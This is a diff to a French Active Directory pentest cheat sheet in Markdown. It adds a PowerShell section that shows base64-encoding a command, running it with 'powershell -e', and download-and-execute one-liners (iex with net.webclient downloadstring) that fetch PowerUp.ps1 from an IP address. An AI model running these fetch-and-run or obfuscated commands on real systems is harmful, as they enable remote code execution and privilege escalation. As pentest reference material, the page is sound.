@@ -1,3 +1,8 @@
+---
+title: Cheat Sheet Active Directory
+permalink: /CheatSheet_AD/
+---
+
 # Cheat Sheet Active Directory
 
 Liste de commandes utiles en pentest Active Directory. Commandes Windows & Linux.
@@ -41,4 +46,18 @@ Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Paramet
 Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -Name LdapEnforceChannelBinding
 # Protocoles autorisés pour échanges NTLM
 Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name LmCompatibilityLevel
+```
+
+## Powershell
+
+``` powershell
+# Convertit une chaine en base64
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("net user"))
+
+# Exécute une commande à partir d'une chaîne base64
+powershell -e bgBlAHQAIAB1AHMAZQByAA==
+
+# Télécharger et exécuter un fichier
+iex (new-object net.webclient).downloadstring('http://10.133.151.246:8080/PowerUp.ps1')
+iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
 ```
